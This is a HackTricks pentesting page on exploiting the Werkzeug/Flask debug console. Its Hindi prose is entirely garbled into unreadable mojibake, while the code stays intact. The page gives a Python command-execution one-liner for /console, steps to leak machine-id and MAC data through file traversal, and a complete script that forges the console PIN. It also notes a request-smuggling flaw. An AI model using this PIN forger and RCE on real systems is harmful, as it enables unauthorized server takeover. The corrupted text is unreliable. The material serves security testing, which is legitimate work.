# Werkzeug / рдлреНрд▓рд╛рд╕реНрдХ рдбреАрдмрдЧ

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

**рд╕реБрд░рдХреНрд╖рд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдФрд░ рдкреЗрдиреЗрдЯреНрд░реЗрд╢рди рдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рддрддреНрдХрд╛рд▓ рдЙрдкрд▓рдмреНрдз рд╕реЗрдЯрдЕрдк**ред рдХрд╣реАрдВ рд╕реЗ рднреА 20+ рдЯреВрд▓ рдФрд░ рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдкреВрд░реНрдг рдкреЗрдирдЯреЗрд╕реНрдЯ рдЪрд▓рд╛рдПрдВ рдЬреЛ рдкреБрдирд░реАрдХреНрд╖рдг рд╕реЗ рд░рд┐рдкреЛрд░реНрдЯрд┐рдВрдЧ рддрдХ рдЬрд╛рддреЗ рд╣реИрдВред рд╣рдо рдкреЗрдирдЯреЗрд╕реНрдЯрд░реНрд╕ рдХреЛ рдмрджрд▓рдиреЗ рдирд╣реАрдВ рд╣реИрдВ - рд╣рдо рдЙрдиреНрд╣реЗрдВ рдХреБрдЫ рд╕рдордп рд╡рд╛рдкрд╕ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╕реНрдЯрдо рдЯреВрд▓, рдкрд╣рдЪрд╛рди рдФрд░ рд╢реЛрд╖рдг рдореЙрдбреНрдпреВрд▓ рд╡рд┐рдХрд╕рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╡реЗ рдЧрд╣рд░рд╛рдИ рдореЗрдВ рдЦреЛрджрдиреЗ, рд╢реИрд▓реНрд╕ рдкреЙрдк рдХрд░рдиреЗ рдФрд░ рдордЬрд╝рд╛ рдХрд░рдиреЗ рдореЗрдВ рд╕рдорд░реНрде рд╣реЛрдВред

{% embed url="https://pentest-tools.com/" %}

## рдХрдВрд╕реЛрд▓ RCE

рдпрджрд┐ рдбреАрдмрдЧ рд╕рдХреНрд░рд┐рдп рд╣реИ рддреЛ рдЖрдк `/рдХрдВрд╕реЛрд▓` рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдФрд░ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (117).png>)

рдЗрдВрдЯрд░рдиреЗрдЯ рдкрд░ рдХрдИ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреНрд╕ рднреА рд╣реИрдВ рдЬреИрд╕реЗ [рдпрд╣](https://github.com/its-arun/Werkzeug-Debug-RCE) рдпрд╛ metasploit рдореЗрдВ рдПрдХред

## рдкрд┐рди рд╕реБрд░рдХреНрд╖рд┐рдд - рдкрде рднреНрд░рдордг

рдХреБрдЫ рдореМрдХреЛрдВ рдкрд░ **`/console`** рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЛ рдкрд┐рди рджреНрд╡рд╛рд░рд╛ рд╕реБрд░рдХреНрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдлрд╝рд╛рдЗрд▓ рднреНрд░рдордг рджреБрд░реБрдкрдпреЛрдЧ** рд╣реИ, рддреЛ рдЖрдк рд╕рднреА рдЖрд╡рд╢реНрдпрдХ рдЬрд╛рдирдХрд╛рд░реА рд▓реАрдХ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЙрд╕ рдкрд┐рди рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХреЗрдВред

### Werkzeug рдХрдВрд╕реЛрд▓ рдкрд┐рди рджреБрд░реБрдкрдпреЛрдЧ

рдРрдк рдореЗрдВ рдПрдХ рдбреАрдмрдЧ рддреНрд░реБрдЯрд┐ рдкреГрд╖реНрда рдХреЛ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдбреАрдмрдЧ рддреНрд░реБрдЯрд┐ рдкреГрд╖реНрда рдХреЛ рдмрд▓рдкреВрд░реНрд╡рдХ рдХрд░реЗрдВ:
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
рдЬрдм рд╡рд░реНрдХреНрдЬреБрдЧ рдХреЗ рдбреАрдмрдЧ рдЗрдВрдЯрд░рдлреЗрд╕ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ "рдХрдВрд╕реЛрд▓ рд▓реЙрдХреНрдб" рд╕реНрдерд┐рддрд┐ рдХреЗ рд╕рдВрджрд░реНрдн рдореЗрдВ рдПрдХ рд╕рдВрджреЗрд╢ рдкрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдХрдВрд╕реЛрд▓ рдХреЛ рдЕрдирд▓реЙрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдкрд┐рди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред рдХрдВрд╕реЛрд▓ рдкрд┐рди рдХрд╛ рд╢реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реБрдЭрд╛рд╡ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╡рд░реНрдХреНрдЬреБрдЧ рдХреЗ рдбреАрдмрдЧ рдкреНрд░рд╛рд░рдВрднреАрдХрд░рдг рдлрд╝рд╛рдЗрд▓ (`__init__.py`) рдореЗрдВ рдкрд┐рди рдЬрдирд░реЗрд╢рди рдПрд▓реНрдЧреЛрд░рд┐рджрдо рдХрд╛ рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдХреЗред рдкрд┐рди рдЬрдирд░реЗрд╢рди рддрдВрддреНрд░ рдХреЛ [**рд╡рд░реНрдХреНрдЬреБрдЧ рд╕реНрд░реЛрдд рдХреЛрдб рднрдВрдбрд╛рд░**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/\_\_init\_\_.py) рд╕реЗ рдЕрдзреНрдпрдпрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рд╣рд╛рд▓рд╛рдВрдХрд┐ рд╕рдВрднрд╛рд╡рд┐рдд рд╕рдВрд╕реНрдХрд░рдг рд╡рд┐рд╕рдВрдЧрддрд┐рдпреЛрдВ рдХреЗ рдХрд╛рд░рдг рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рд░реНрд╡рд░ рдХреЛрдб рдХреЛ рдлрд╝рд╛рдЗрд▓ рдЯреНрд░рд╛рд╡рд░реНрд╕рд▓ рд╡рд▓рдирд░реЗрдмрд┐рд▓рд┐рдЯреА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рд╕рд▓рд╛рд╣ рджреА рдЬрд╛рддреА рд╣реИред

рдХрдВрд╕реЛрд▓ рдкрд┐рди рдХрд╛ рд╢реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рджреЛ рд╕реЗрдЯ рдХреЗ рдЪрд░ `probably_public_bits` рдФрд░ `private_bits` рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ:

#### **`probably_public_bits`**

* **`username`**: рд╡рд╣ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╣реИ рдЬрд┐рд╕рдиреЗ рдлреНрд▓рд╛рд╕реНрдХ рд╕рддреНрд░ рдкреНрд░рд╛рд░рдВрдн рдХрд┐рдпрд╛ред
* **`modname`**: рд╕рд╛рдорд╛рдиреНрдпрдд: `flask.app` рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* **`getattr(app, '__name__', getattr(app.__class__, '__name__'))`**: рд╕рд╛рдорд╛рдиреНрдпрдд: **Flask** рдХреЛ рд╣рд▓ рдХрд░рддрд╛ рд╣реИред
* **`getattr(mod, '__file__', None)`**: рдлреНрд▓рд╛рд╕реНрдХ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ `app.py` рдХрд╛ рдкреВрд░рд╛ рдкрде рдХреЛ рдкреНрд░рд╕реНрддреБрдд рдХрд░рддрд╛ рд╣реИ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `/usr/local/lib/python3.5/dist-packages/flask/app.py`)ред рдпрджрд┐ `app.py` рд▓рд╛рдЧреВ рдирд╣реАрдВ рд╣реИ, **`app.pyc` рдХреЛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ**ред

#### **`private_bits`**

* **`uuid.getnode()`**: рд╡рд░реНрддрдорд╛рди рдорд╢реАрди рдХрд╛ MAC рдкрддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ `str(uuid.getnode())` рджрд╢рдорд▓рд╡ рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рдЕрдиреБрд╡рд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИред
* **рд╕рд░реНрд╡рд░ рдХрд╛ MAC рдкрддрд╛ рд▓рдЧрд╛рдиреЗ** рдХреЗ рд▓рд┐рдП, рд╡реНрдпрдХреНрддрд┐рдЧрдд рдиреЗрдЯрд╡рд░реНрдХ рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЛ рдкрд╣рдЪрд╛рдирдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕реЗ рдРрдк рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `ens3`)ред рд╕рдВрджреЗрд╣ рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ, **`/proc/net/arp` рдХреЛ рд▓реАрдХ рдХрд░реЗрдВ** рдЙрдкрдХрд░рдг рдЖрдИрдбреА рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП, рдлрд┐рд░ **`/sys/class/net/<рдЙрдкрдХрд░рдг рдЖрдИрдбреА>/address`** рд╕реЗ MAC рдкрддрд╛ **рдирд┐рдХрд╛рд▓реЗрдВ**ред
*   рдПрдХ рд╣реЗрдХреНрд╕рд╛рдбреЗрд╕рд┐рдорд▓ MAC рдкрддреЗ рдХреЛ рджрд╢рдорд▓рд╡ рдореЗрдВ рд░реВрдкрд╛рдВрддрд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ:

```python
# рдЙрджрд╛рд╣рд░рдг MAC рдкрддрд╛: 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```
* **`get_machine_id()`**: `/etc/machine-id` рдпрд╛ `/proc/sys/kernel/random/boot_id` рд╕реЗ рдбреЗрдЯрд╛ рдХреЛ рдЬреЛрдбрд╝рддрд╛ рд╣реИ рдФрд░ `/proc/self/cgroup` рдХреА рдкрд┐рдЫрд▓реА рд╕реНрд▓реИрд╢ (`/`) рдХреЗ рдмрд╛рдж рдХреА рдкрд╣рд▓реА рдкрдВрдХреНрддрд┐ рдХреЗ рд╕рд╛рдеред

<details>

<summary>`get_machine_id()` рдХреЗ рд▓рд┐рдП рдХреЛрдб</summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

рд╕рднреА рдЖрд╡рд╢реНрдпрдХ рдбреЗрдЯрд╛ рдХреЛ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ Werkzeug рдХрдВрд╕реЛрд▓ PIN рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдирд┐рд░реНрдорд┐рдд `probably_public_bits` рдФрд░ `private_bits` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдПрдХ рд╣реИрд╢ рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рдЬрд┐рд╕рдХреЗ рдмрд╛рдж рдЗрд╕реЗ рдФрд░ рдЕрдзрд┐рдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП рдкреНрд░рд╕рдВрд╕реНрдХрд░рдг рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЕрдВрддрд┐рдо рдкрд┐рди рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдиреАрдЪреЗ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдкрд╛рдпрдерди рдХреЛрдб рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',  # username
'flask.app',  # modname
'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
рдпрд╣ рд╕реНрдХреНрд░рд┐рдкреНрдЯ PIN рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдмрд┐рдЯреНрд╕ рдХреЛ рдХрдВрдХрдЯрдиреЗрдЯ рдХрд░рдХреЗ рд╣реИрд╢ рдХрд░рдХреЗ, рд╡рд┐рд╢реЗрд╖ рдирдордХреЛрдВ (`рдХреБрдХреАрд╕реЙрд▓реНрдЯ` рдФрд░ `рдкрд┐рдирд╕реЙрд▓реНрдЯ`) рдХреЛ рдЬреЛрдбрд╝рдХрд░, рдФрд░ рдЖрдЙрдЯрдкреБрдЯ рдХреЛ рд╕реНрд╡рд░реВрдкрд┐рдд рдХрд░рдХреЗред рдпрд╣ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ `probably_public_bits` рдФрд░ `private_bits` рдХреЗ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдорд╛рди рд▓рдХреНрд╖реНрдпрд┐рдд рд╕рд┐рд╕реНрдЯрдо рд╕реЗ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдП рдЬрд╛рдиреЗ рдЪрд╛рд╣рд┐рдП рддрд╛рдХрд┐ рд╡рд░реНрдХрдЬрд╝реВрдЧ рдХрдВрд╕реЛрд▓ рджреНрд╡рд╛рд░рд╛ рдЕрдкреЗрдХреНрд╖рд┐рдд PIN рдХреЗ рд╕рд╛рде рдореЗрд▓ рдЦрд╛рдПред

{% hint style="success" %}
рдпрджрд┐ рдЖрдк **рдкреБрд░рд╛рдиреЗ рд╕рдВрд╕реНрдХрд░рдг** рдкрд░ рд╣реИрдВ, рддреЛ **sha1** рдХреА рдмрдЬрд╛рдп **md5 рд╣реИрд╢рд┐рдВрдЧ рдПрд▓реНрдЧреЛрд░рд┐рджрдо** рдХреЛ рдмрджрд▓рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВред
{% endhint %}

## Werkzeug рдпреВрдирд┐рдХреЛрдб рд╡рд░реНрдг

[**рдЗрд╕ рдореБрджреНрджреЗ**](https://github.com/pallets/werkzeug/issues/2833) рдореЗрдВ рджреЗрдЦрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ Werkzeug рд╣реЗрдбрд░ рдореЗрдВ рдпреВрдирд┐рдХреЛрдб рд╡рд░реНрдгреЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ рдЕрдиреБрд░реЛрдз рдХреЛ рдмрдВрдж рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИред рдФрд░ [**рдЗрд╕ рд▓реЗрдЦрди**](https://mizu.re/post/twisty-python) рдореЗрдВ рд╕реНрдкрд╖реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдпрд╣ рдПрдХ CL.0 рдЕрдиреБрд░реЛрдз рд╕реНрдордЧрд▓рд┐рдВрдЧ рд╡рдВрд╢рд╛рдЬрдиреНрдпрддрд╛ рдХрд╛ рдХрд╛рд░рдг рдмрди рд╕рдХрддрд╛ рд╣реИред

рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ Werkzeug рдореЗрдВ рдХреБрдЫ **рдпреВрдирд┐рдХреЛрдб** рд╡рд░реНрдг рднреЗрдЬрдирд╛ рд╕рдВрднрд╡ рд╣реИ рдФрд░ рдпрд╣ рд╕рд░реНрд╡рд░ **рдмреНрд░реЗрдХ** рдХрд░ рджреЗрдЧрд╛ред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ HTTP рдХрдиреЗрдХреНрд╢рди рд╣реЗрдбрд░ **`Connection: keep-alive`** рдХреЗ рд╕рд╛рде рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рдерд╛, рддреЛ рдЕрдиреБрд░реЛрдз рдХрд╛ рд╢рд░реАрд░ рдкрдврд╝рд╛ рдирд╣реАрдВ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдХрдиреЗрдХреНрд╢рди рдЕрднреА рднреА рдЦреБрд▓рд╛ рд░рд╣реЗрдЧрд╛, рдЗрд╕рд▓рд┐рдП рдЕрдиреБрд░реЛрдз рдХрд╛ **рд╢рд░реАрд░** рдЕрдЧрд▓реЗ HTTP рдЕрдиреБрд░реЛрдз рдХреЗ рд░реВрдк рдореЗрдВ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

## рд╕рдВрджрд░реНрдн

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)
* [**https://github.com/pallets/werkzeug/issues/2833**](https://github.com/pallets/werkzeug/issues/2833)
* [**https://mizu.re/post/twisty-python**](https://mizu.re/post/twisty-python)

<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

**рд╕реБрд░рдХреНрд╖рд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдФрд░ рдкреЗрдиреЗрдЯреНрд░реЗрд╢рди рдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рддреБрд░рдВрдд рдЙрдкрд▓рдмреНрдз рд╕реЗрдЯрдЕрдк**ред рдХрд╣реАрдВ рд╕реЗ рднреА 20+ рдЯреВрд▓ рдФрд░ рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХреЗ рд╕рд╛рде рдПрдХ рдкреВрд░реНрдг рдкреЗрдирдЯреЗрд╕реНрдЯ рдЪрд▓рд╛рдПрдВ рдЬреЛ рдкреБрдирд░реАрдХреНрд╖рдг рд╕реЗ рд░рд┐рдкреЛрд░реНрдЯрд┐рдВрдЧ рддрдХ рдЬрд╛рддреЗ рд╣реИрдВред рд╣рдо рдкреЗрдирдЯреЗрд╕реНрдЯрд░реНрд╕ рдХреЛ рдмрджрд▓рдиреЗ рдирд╣реАрдВ рджреЗрддреЗ рд╣реИрдВ - рд╣рдо рдЙрдиреНрд╣реЗрдВ рд╡рд╛рдкрд╕ рдХреБрдЫ рд╕рдордп рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд╕реНрдЯрдо рдЯреВрд▓, рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдФрд░ рд╢реЛрд╖рдг рдореЙрдбреНрдпреВрд▓ рд╡рд┐рдХрд╕рд┐рдд рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╡реЗ рдЧрд╣рд░рд╛рдИ рдореЗрдВ рдЦреЛрдЬ рдХрд░ рд╕рдХреЗрдВ, рд╢реИрд▓реНрд╕ рдкреЙрдк рдХрд░ рд╕рдХреЗрдВ, рдФрд░ рдордЬрд╝рд╛ рдХрд░ рд╕рдХреЗрдВред

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рдмрдирд╛рдиреЗ рдХреЗ рд╕рд╛рде</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди **HackTricks** рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **PDF рдореЗрдВ HackTricks рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдФрд░ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреНрд▓рд╛рдЙрдб github рд░реЗрдкреЛ рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред

</details>
